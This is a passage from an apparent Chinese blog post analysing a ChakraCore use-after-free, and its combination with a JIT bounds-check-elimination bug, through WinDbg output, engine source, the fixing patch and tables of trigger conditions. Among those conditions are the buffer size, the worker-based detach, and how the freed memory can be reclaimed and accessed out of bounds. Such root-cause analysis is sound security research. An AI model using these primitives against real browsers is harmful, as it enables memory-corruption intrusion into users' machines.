class="line">chakra!Js::TypedArray&lt;unsigned int,0,0&gt;::NewInstance+0xbf:</span><br><span class="line">00007ffa&#96;d2c50d8f 4084ff test dil,dil</span><br><span class="line">00007ffa&#96;d2c50d92 0f8580912700 jne chakra!UnifiedRegex::AltNode::IsCharTrieArm+0x400c8 (00007ffa&#96;d2ec9f18)</span><br><span class="line">00007ffa&#96;d2c50d98 4883c430 add rsp,30h</span><br><span class="line">00007ffa&#96;d2c50d9c 5f pop rdi</span><br><span class="line">00007ffa&#96;d2c50d9d 5e pop rsi</span><br><span class="line">00007ffa&#96;d2c50d9e 5b pop rbx</span><br><span class="line">00007ffa&#96;d2c50d9f c3 ret</span><br><span class="line">00007ffa&#96;d2c50da0 cc int 3</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120742.png" alt=""></p><h3 id="2"><a href="#2" class="headerlink" title="[2]"></a>[2]</h3><ul><li>worker.postMessage(buffer,[buffer]);<br>移交buffer的所有权给worker线程</li><li>worker.terminate();<br>结束worker线程，触发buffer的释放操作</li></ul><p><strong>chakra里这种结束线程并释放buffer的操作是我以前没有了解过的，而这也是这个漏洞的关键之一。</strong></p><h3 id="Free-but-no-set-NULL"><a href="#Free-but-no-set-NULL" class="headerlink" title="Free but no set NULL"></a>Free but no set NULL</h3><p>将长度设置为0，但是未将View对<strong>ArrayBuffer Object对象申请的缓冲区的引用</strong>置NULL。</p><p>bu chakra!Js::ArrayBuffer::DetachAndGetState</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; bu chakra!Js::ArrayBuffer::DetachAndGetState</span><br><span class="line">0:010&gt; g</span><br><span class="line">Breakpoint 3 hit</span><br><span class="line">chakra!Js::ArrayBuffer::DetachAndGetState:</span><br><span class="line">00007ffa&#96;d30d8ab0 48894c2408 mov qword ptr [rsp+8],rcx ss:000000b0&#96;396fb640&#x3D;000001d915dc7e80</span><br><span class="line">0:010&gt; uf .</span><br><span class="line">chakra!Js::ArrayBuffer::DetachAndGetState:</span><br><span class="line">...</span><br><span class="line">00007ffa&#96;d30d8b0a e8bdfdffff call chakra!Js::ArrayBuffer::ClearParentsLength (00007ffa&#96;d30d88cc)</span><br><span class="line">...</span><br><span class="line">00007ffa&#96;d30d8b46 c3 ret</span><br></pre></td></tr></table></figure><p>call chakra!Js::ArrayBuffer::ClearParentsLength<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120527.jpg" alt=""></p><ul><li>TypeId<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">enum TypeId</span><br><span class="line">&#123;</span><br><span class="line">    TypeIds_Undefined &#x3D; 0,</span><br><span class="line">    TypeIds_Null &#x3D; 1,</span><br><span class="line"></span><br><span class="line">    TypeIds_UndefinedOrNull &#x3D;  TypeIds_Null,</span><br><span class="line"></span><br><span class="line">    TypeIds_Boolean &#x3D; 2,</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; backend typeof() &#x3D;&#x3D; &quot;number&quot; is true for typeIds</span><br><span class="line">    &#x2F;&#x2F; between TypeIds_FirstNumberType &lt;&#x3D; typeId &lt;&#x3D; TypeIds_LastNumberType</span><br><span class="line">    TypeIds_Integer &#x3D; 3,</span><br><span class="line">    TypeIds_FirstNumberType &#x3D; TypeIds_Integer,</span><br><span class="line">    TypeIds_Number &#x3D; 4,</span><br><span class="line">    TypeIds_Int64Number &#x3D; 5,</span><br><span class="line">    TypeIds_UInt64Number &#x3D; 6,</span><br><span class="line">    TypeIds_LastNumberType &#x3D; TypeIds_UInt64Number,</span><br><span class="line"></span><br><span class="line">    TypeIds_String &#x3D; 7,</span><br><span class="line">    TypeIds_Symbol &#x3D; 8,</span><br><span class="line"></span><br><span class="line">    TypeIds_LastToPrimitiveType &#x3D; TypeIds_Symbol,</span><br><span class="line"></span><br><span class="line">    TypeIds_Enumerator &#x3D; 9,</span><br><span class="line">    TypeIds_VariantDate &#x3D; 10,</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; SIMD types </span><br><span class="line">    &#x2F;&#x2F;[Please maintain Float32x4 as the first SIMDType and Bool8x16 as the last]</span><br><span class="line">    TypeIds_SIMDFloat32x4 &#x3D; 11,</span><br><span class="line">    TypeIds_SIMDFloat64x2 &#x3D; 12,</span><br><span class="line">    TypeIds_SIMDInt32x4 &#x3D; 13,</span><br><span class="line">    TypeIds_SIMDInt16x8 &#x3D; 14,</span><br><span class="line">    TypeIds_SIMDInt8x16 &#x3D; 15,</span><br><span class="line"></span><br><span class="line">    TypeIds_SIMDUint32x4 &#x3D; 16,</span><br><span class="line">    TypeIds_SIMDUint16x8 &#x3D; 17,</span><br><span class="line">    TypeIds_SIMDUint8x16 &#x3D; 18,</span><br><span class="line"></span><br><span class="line">    TypeIds_SIMDBool32x4 &#x3D; 19,</span><br><span class="line">    TypeIds_SIMDBool16x8 &#x3D; 20,</span><br><span class="line">    TypeIds_SIMDBool8x16 &#x3D; 21,</span><br><span class="line">    TypeIds_LastJavascriptPrimitiveType &#x3D; TypeIds_SIMDBool8x16,</span><br><span class="line"></span><br><span class="line">    TypeIds_HostDispatch &#x3D; 22,</span><br><span class="line">    TypeIds_WithScopeObject &#x3D; 23,</span><br><span class="line">    TypeIds_UndeclBlockVar &#x3D; 24,</span><br><span class="line"></span><br><span class="line">    TypeIds_LastStaticType &#x3D; TypeIds_UndeclBlockVar,</span><br><span class="line"></span><br><span class="line">    TypeIds_Proxy &#x3D; 25,</span><br><span class="line">    TypeIds_Function &#x3D; 26,</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;</span><br><span class="line">    &#x2F;&#x2F; The backend expects only objects whose typeof() &#x3D;&#x3D;&#x3D; &quot;object&quot; to have a</span><br><span class="line">    &#x2F;&#x2F; TypeId &gt;&#x3D; TypeIds_Object. Only &#39;null&#39; is a special case because it</span><br><span class="line">    &#x2F;&#x2F; has a static type.</span><br><span class="line">    &#x2F;&#x2F;</span><br><span class="line">    TypeIds_Object &#x3D; 27,</span><br><span class="line">    TypeIds_Array &#x3D; 28,</span><br><span class="line">    TypeIds_ArrayFirst &#x3D; TypeIds_Array,</span><br><span class="line">    TypeIds_NativeIntArray &#x3D; 29,</span><br><span class="line">  #if ENABLE_COPYONACCESS_ARRAY</span><br><span class="line">    TypeIds_CopyOnAccessNativeIntArray &#x3D; 30,</span><br><span class="line">  #endif</span><br><span class="line">    TypeIds_NativeFloatArray &#x3D; 31,</span><br><span class="line">    TypeIds_ArrayLast &#x3D; TypeIds_NativeFloatArray,</span><br><span class="line">    TypeIds_Date &#x3D; 32,</span><br><span class="line">    TypeIds_RegEx &#x3D; 33,</span><br><span class="line">    TypeIds_Error &#x3D; 34,</span><br><span class="line">    TypeIds_BooleanObject &#x3D; 35,</span><br><span class="line">    TypeIds_NumberObject &#x3D; 36,</span><br><span class="line">    TypeIds_StringObject &#x3D; 37,</span><br><span class="line">    TypeIds_SIMDObject &#x3D; 38,</span><br><span class="line">    TypeIds_Arguments &#x3D; 39,</span><br><span class="line">    TypeIds_ES5Array &#x3D; 40,</span><br><span class="line">    TypeIds_ArrayBuffer &#x3D; 41,</span><br><span class="line">    TypeIds_Int8Array &#x3D; 42,</span><br><span class="line">    TypeIds_TypedArrayMin &#x3D; TypeIds_Int8Array,</span><br><span class="line">    TypeIds_TypedArraySCAMin &#x3D; TypeIds_Int8Array, &#x2F;&#x2F; Min SCA supported TypedArray TypeId</span><br><span class="line">    TypeIds_Uint8Array &#x3D; 43,</span><br><span class="line">    TypeIds_Uint8ClampedArray &#x3D; 44,</span><br><span class="line">    TypeIds_Int16Array &#x3D; 45,</span><br><span class="line">    TypeIds_Uint16Array &#x3D; 46,</span><br><span class="line">    TypeIds_Int32Array &#x3D; 47,</span><br><span class="line">    TypeIds_Uint32Array &#x3D; 48,&#x2F;&#x2F;----&gt;0x30</span><br><span class="line">    TypeIds_Float32Array &#x3D; 49,</span><br><span class="line">    TypeIds_Float64Array &#x3D; 50,</span><br><span class="line">    TypeIds_TypedArraySCAMax &#x3D; TypeIds_Float64Array, &#x2F;&#x2F; Max SCA supported TypedArray TypeId</span><br><span class="line">    TypeIds_Int64Array &#x3D; 51,</span><br><span class="line">    TypeIds_Uint64Array &#x3D; 52,</span><br><span class="line">    TypeIds_CharArray &#x3D; 53,</span><br><span class="line">    TypeIds_BoolArray &#x3D; 54,</span><br><span class="line">    TypeIds_TypedArrayMax &#x3D; TypeIds_BoolArray,</span><br><span class="line">    TypeIds_EngineInterfaceObject &#x3D; 55,</span><br><span class="line">    TypeIds_DataView &#x3D; 56,</span><br><span class="line">    TypeIds_WinRTDate &#x3D; 57,</span><br><span class="line">    TypeIds_Map &#x3D; 58,</span><br><span class="line">    TypeIds_Set &#x3D; 59,</span><br><span class="line">    TypeIds_WeakMap &#x3D; 60,</span><br><span class="line">    TypeIds_WeakSet &#x3D; 61,</span><br><span class="line">    TypeIds_SymbolObject &#x3D; 62,</span><br><span class="line">    TypeIds_ArrayIterator &#x3D; 63,</span><br><span class="line">    TypeIds_MapIterator &#x3D; 64,</span><br><span class="line">    TypeIds_SetIterator &#x3D; 65,</span><br><span class="line">    TypeIds_StringIterator &#x3D; 66,</span><br><span class="line">    TypeIds_JavascriptEnumeratorIterator &#x3D; 67,      &#x2F;* Unused *&#x2F;</span><br><span class="line">    TypeIds_Generator &#x3D; 68,</span><br><span class="line">    TypeIds_Promise &#x3D; 69,</span><br><span class="line">    TypeIds_SharedArrayBuffer &#x3D; 70,</span><br><span class="line"></span><br><span class="line">    TypeIds_WebAssemblyModule &#x3D; 71,</span><br><span class="line">    TypeIds_WebAssemblyInstance &#x3D; 72,</span><br><span class="line">    TypeIds_WebAssemblyMemory &#x3D; 73,</span><br><span class="line">    TypeIds_WebAssemblyTable &#x3D; 74,</span><br><span class="line"></span><br><span class="line">    TypeIds_LastBuiltinDynamicObject &#x3D; TypeIds_WebAssemblyTable,</span><br><span class="line">    TypeIds_GlobalObject &#x3D; 75,</span><br><span class="line">    TypeIds_ModuleRoot &#x3D; 76,</span><br><span class="line">    TypeIds_LastTrueJavascriptObjectType &#x3D; TypeIds_ModuleRoot,</span><br><span class="line"></span><br><span class="line">    TypeIds_HostObject &#x3D; 77,</span><br><span class="line">    TypeIds_ActivationObject &#x3D; 78,</span><br><span class="line">    TypeIds_SpreadArgument &#x3D; 79,</span><br><span class="line">    TypeIds_ModuleNamespace &#x3D; 80,</span><br><span class="line">    TypeIds_ListIterator &#x3D; 81,</span><br><span class="line"></span><br><span class="line">    TypeIds_Limit &#x2F;&#x2F;add a new TypeId before TypeIds_Limit or before TypeIds_LastTrueJavascriptObjectType</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><code>TypeIds_Uint32Array = 48,//----&gt;0x30</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120854.jpg" alt=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; uf chakra!Js::ArrayBuffer::ClearParentsLength</span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength:</span><br><span class="line">00007ffa&#96;d30d88cc 4889542410 mov qword ptr [rsp+10h],rdx</span><br><span class="line">00007ffa&#96;d30d88d1 48894c2408 mov qword ptr [rsp+8],rcx</span><br><span class="line">00007ffa&#96;d30d88d6 4883ec28 sub rsp,28h</span><br><span class="line">00007ffa&#96;d30d88da 488b4c2438 mov rcx,qword ptr [rsp+38h]</span><br><span class="line">00007ffa&#96;d30d88df 4885c9 test rcx,rcx----&gt;if TypedArrayBuffer&#x3D;&#x3D;NULL,则直接return</span><br><span class="line">00007ffa&#96;d30d88e2 742d je chakra!Js::ArrayBuffer::ClearParentsLength+0x45 (00007ffa&#96;d30d8911) Branch--&gt;return</span><br><span class="line"></span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x18:</span><br><span class="line">00007ffa&#96;d30d88e4 488bc1 mov rax,rcx</span><br><span class="line">00007ffa&#96;d30d88e7 48c1e830 shr rax,30h</span><br><span class="line">00007ffa&#96;d30d88eb 4883f801 cmp rax,1-----&gt;如果是一个small int值，那么其右移48位得到的值应该是1，不是TypedArray Object，则直接return</span><br><span class="line">00007ffa&#96;d30d88ef 7420 je chakra!Js::ArrayBuffer::ClearParentsLength+0x45 (00007ffa&#96;d30d8911) Branch ---&gt;return</span><br><span class="line"></span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x25:</span><br><span class="line">00007ffa&#96;d30d88f1 e8fa8cd4ff call chakra!Js::JavascriptNumber::Is_NoTaggedIntCheck (00007ffa&#96;d2e215f0)</span><br><span class="line">00007ffa&#96;d30d88f6 84c0 test al,al-----&gt;如果是一个NoTaggedInt值，不是TypedArray Object，则直接return</span><br><span class="line">00007ffa&#96;d30d88f8 7517 jne chakra!Js::ArrayBuffer::ClearParentsLength+0x45 (00007ffa&#96;d30d8911) Branch----&gt;return</span><br><span class="line"></span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x2e:</span><br><span class="line">00007ffa&#96;d30d88fa 488b4108 mov rax,qword ptr [rcx+8]</span><br><span class="line">00007ffa&#96;d30d88fe 83382a cmp dword ptr [rax],2Ah &#x2F;&#x2F;小于0x2A即42，即非TypedArray，则return</span><br><span class="line">00007ffa&#96;d30d8901 7c0e jl chakra!Js::ArrayBuffer::ClearParentsLength+0x45 (00007ffa&#96;d30d8911) Branch &#x2F;&#x2F;--&gt;return</span><br><span class="line"></span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x37:</span><br><span class="line">00007ffa&#96;d30d8903 833836 cmp dword ptr [rax],36h &#x2F;&#x2F;大于0x2A(42)，小于等于0x36(54)，则将长度置为0</span><br><span class="line"></span><br><span class="line">    TypeIds_Uint8Array &#x3D; 43,</span><br><span class="line">    TypeIds_Uint8ClampedArray &#x3D; 44,</span><br><span class="line">    TypeIds_Int16Array &#x3D; 45,</span><br><span class="line">    TypeIds_Uint16Array &#x3D; 46,</span><br><span class="line">    TypeIds_Int32Array &#x3D; 47,</span><br><span class="line">    TypeIds_Uint32Array &#x3D; 48,&#x2F;&#x2F;----&gt;0x30</span><br><span class="line">    TypeIds_Float32Array &#x3D; 49,</span><br><span class="line">    TypeIds_Float64Array &#x3D; 50,</span><br><span class="line">    TypeIds_TypedArraySCAMax &#x3D; TypeIds_Float64Array, &#x2F;&#x2F; Max SCA supported TypedArray TypeId</span><br><span class="line">    TypeIds_Int64Array &#x3D; 51,</span><br><span class="line">    TypeIds_Uint64Array &#x3D; 52,</span><br><span class="line">    TypeIds_CharArray &#x3D; 53,</span><br><span class="line">    TypeIds_BoolArray &#x3D; 54,</span><br><span class="line"></span><br><span class="line">00007ffa&#96;d30d8906 7e05 jle chakra!Js::ArrayBuffer::ClearParentsLength+0x41 (00007ffa&#96;d30d890d) Branch----&gt;跳转</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x41:</span><br><span class="line">00007ffa&#96;d30d890d 83612000 and dword ptr [rcx+20h],0-----&gt;将长度设置为0，但是未将View对ArrayBuffer Object对象申请的缓冲区的引用置NULL。</span><br><span class="line"></span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x45:</span><br><span class="line">00007ffa&#96;d30d8911 4883c428 add rsp,28h</span><br><span class="line">00007ffa&#96;d30d8915 c3 ret</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120909.jpg" alt=""><br>将长度设置为0</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120924.jpg" alt=""></p><p>对应到ClearParentsLength源码中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ArrayBuffer::ClearParentsLength</span><span class="params">(ArrayBufferParent* pare nt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (JavascriptOperators::GetTypeId(parent))</span><br><span class="line">    &#123;</span><br><span class="line">                            ...</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Uint32Array:</span><br><span class="line">                           ...</span><br><span class="line">            TypedArrayBase::FromVar(parent)-&gt;length = <span class="number">0</span>;-------------&gt;<span class="built_in">free</span> but no <span class="built_in">set</span> <span class="literal">NULL</span></span><br></pre></td></tr></table></figure><p><strong>注意此时其实ArrayBuffer Object所分配的buffer已经被释放了，所以可以被我们重新分配出来，占位。</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120951.jpg" alt=""></p><h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p><a href="https://github.com/Microsoft/ChakraCore/commit/1ae7e3ce95515758b4cd7215cb4e48539a0f4031" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/commit/1ae7e3ce95515758b4cd7215cb4e48539a0f4031</a><br>patch就是将未置为NULL的指针置为NULL了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+ <span class="function"><span class="keyword">void</span> <span class="title">TypedArrayBase::ClearLengthAndBufferOnDetach</span><span class="params">()</span></span></span><br><span class="line">+ &#123;</span><br><span class="line">+ AssertMsg(IsDetachedBuffer(), <span class="string">"Array buffer should be detached if we're calling this method"</span>);</span><br><span class="line">+</span><br><span class="line">+ <span class="keyword">this</span>-&gt;length = <span class="number">0</span>;</span><br><span class="line">+ <span class="keyword">this</span>-&gt;<span class="built_in">buffer</span> = <span class="literal">nullptr</span>;</span><br><span class="line">+ &#125;</span><br><span class="line">+</span><br></pre></td></tr></table></figure><h3 id="虚表"><a href="#虚表" class="headerlink" title="虚表"></a>虚表</h3><p>从patch里找一个case</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TypeIds_Int32Array:</span><br><span class="line">                <span class="keyword">if</span> (Int32VirtualArray::Is(parent))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (VirtualTableInfo&lt;Int32VirtualArray&gt;::HasVirtualTable(parent))</span><br><span class="line">                    &#123;</span><br><span class="line">                        VirtualTableInfo&lt;Int32Array&gt;::SetVirtualTable(parent);</span><br><span class="line">                    &#125;</span><br><span class="line">...</span><br><span class="line">                &#125;</span><br><span class="line">                TypedArrayBase::FromVar(parent)-&gt;ClearLengthAndBufferOnDetach();</span><br><span class="line">                <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>注意到patch里有这样的代码，目的是什么呢？<br>SetVirtualTable将虚表由Int32VirtualArray修改为Int32Array。<br>而我们知道0234触发的条件是如下代码，注意<code>IsLikelyOptimizedVirtualTypedArray</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (baseValueType.IsLikelyOptimizedVirtualTypedArray() &amp;&amp; !Js::IsSimd128LoadStore(instr-&gt;m_opcode) <span class="comment">/*Always extract bounds for SIMD */</span>)</span><br><span class="line"> &#123;</span><br><span class="line">        ....</span><br><span class="line">         eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这个Patch的目的仍然和0234有关，将漏洞联系起来看。<br>这样去修改虚表我测试了一下，暂时没找到什么可能引入的安全问题。</p><h2 id="开发者的Assumption"><a href="#开发者的Assumption" class="headerlink" title="开发者的Assumption"></a>开发者的Assumption</h2><p>即使存在对free了的内存的引用，由于MemGC，并不会直接造成UAF，因为不可占位。而且将length置为0，就不存在可以继续操作这个缓冲区的的可能。</p><ol><li>在开发者的假设里，MemGC对引用进行扫描，从而不释放仍有引用指向的缓冲区，可以很好的缓解UAF，<strong>但是通过控制ArrayBuffer的长度，我们可以让它使用VirtualAlloc分配，而不是GC</strong>。于是就没有上述的检查。</li><li>其实不把指针置为NULL这种写法理论上并不一定能造成影响，因为我们已经把length置为0了，理论上说我们已经无法控制分配的缓冲区了，无法读写。</li></ol><p><strong>但是由于利用0234，可以在JIT时消除上界下界，于是我们就有了一个越界读写，可以打破length等于0给我们造成的限制。</strong></p><h2 id="Pattern"><a href="#Pattern" class="headerlink" title="Pattern"></a>Pattern</h2><p>这个漏洞的发现是由0234逐次引入的，要找到一个UAF，首先要定位到一个<strong>可控对象的释放操作</strong>，这也是我不熟知的一个点。<br>还有就是在其中找到直接将length置为0，就“不可操作”了，这种释放方式。<br>从该函数的其他case可以看到dataview也是这么操作的，删除Length但是不置NULL，但是由于无法触发JIT的消除边界优化，所以更难以利用了。（也被一起补了）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TypeIds_DataView:</span><br><span class="line">    DataView::FromVar(parent)-&gt;length = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="0234（OOB）触发的条件（由有限到推广）"><a href="#0234（OOB）触发的条件（由有限到推广）" class="headerlink" title="0234（OOB）触发的条件（由有限到推广）"></a>0234（OOB）触发的条件（由有限到推广）</h3><table><thead><tr><th>有限</th><th align="center">推广</th></tr></thead><tbody><tr><td>ArrayBuffer(0x10000)</td><td align="center">需要一个大于0x10000大小的buffer，这样才会让TypedArray的虚表类型是VirtualArray，从而触发JIT优化</td></tr><tr><td>Uint32Array(buffer)</td><td align="center"><strong>单个element size大于1字节的VirtualTypedArray</strong>（即除了Uint8Array和Int8Array）</td></tr><tr><td>循环次数足够大，触发JIT优化（循环体内是对数组的赋值，在优化后去掉边界检查）</td><td align="center">循环次数足够大，触发JIT优化（循环体内是对数组的赋值，在优化后去掉边界检查）</td></tr></tbody></table><h3 id="0236（UAF）触发的条件（由有限到推广）"><a href="#0236（UAF）触发的条件（由有限到推广）" class="headerlink" title="0236（UAF）触发的条件（由有限到推广）"></a>0236（UAF）触发的条件（由有限到推广）</h3><table><thead><tr><th>有限</th><th align="center">推广</th></tr></thead><tbody><tr><td>ArrayBuffer(0x10000)</td><td align="center">需要一个大于0x10000大小的buffer，使得通过VirtualAlloc分配，从而绕过MemGC的引用计数，延迟释放，才能引发UAF</td></tr><tr><td>Uint32Array(buffer)</td><td align="center">ArrayBuffer的一个parent对象。detach之后在其中仍然保留一个指向缓冲区的引用，从而造成UAF，注意这里不仅TypedArray可以UAF，DateView也可以。但是DataView无法和0234结合使用，不满足IsLikelyOptimizedVirtualTypedArray</td></tr><tr><td>worker.postMessage(buffer,[buffer]);worker.terminate();</td><td align="center">进行Detach，触发UAF</td></tr></tbody></table><h3 id="交集"><a href="#交集" class="headerlink" title="交集"></a>交集</h3><p><strong>关于虚表的部分补充在上面patch第二部分。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ArrayBuffer(<span class="number">0x10000</span>)</span><br><span class="line">Uint32Array(<span class="built_in">buffer</span>)</span><br></pre></td></tr></table></figure><p>虽然PoC里这部分相同，但是目的却各不相同。<br>ArrayBuffer(0x10000)在0236的主要目的是绕过MemGC的UAF缓解机制</p><p>而在0234，目的则是由于通过VA分配，update虚表为VirtualArray，从而触发JIT优化。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (baseValueType.IsLikelyOptimizedVirtualTypedArray() &amp;&amp; !Js::IsSimd128LoadStore(instr-&gt;m_opcode) <span class="comment">/*Always extract bounds for SIMD */</span>)</span><br><span class="line"> &#123;</span><br><span class="line">        ....</span><br><span class="line">         eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>update虚表操作如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chakra!Js::TypedArray&lt;<span 